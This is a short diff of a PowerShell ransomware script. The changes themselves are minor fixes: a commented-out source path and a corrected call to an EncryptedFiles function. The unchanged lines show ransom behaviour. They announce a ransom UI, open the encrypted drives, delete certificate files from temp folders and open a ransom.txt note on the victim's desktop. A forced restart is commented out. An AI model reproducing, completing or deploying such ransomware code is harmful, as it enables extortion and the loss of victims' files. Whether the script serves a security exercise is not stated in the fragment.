@@ -310,7 +310,7 @@ Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
 
 function EncryptedFiles 
 { 
-$Source = "w:\" # replace the path with the folders you encrypted
+# $Source = "w:\" # replace the path with the folders you encrypted
 explorer w:
 explorer x:
 explorer y:
@@ -444,7 +444,7 @@ Remove-Item c:\windows\temp\x.cer
 Remove-Item C:\temp\cert.cer
 
 Start-Sleep 3
-EncryptedFiles()
+EncryptedFiles
 notepad c:/users/$env:USERNAME/desktop/ransom.txt
 
 # restart-computer -force
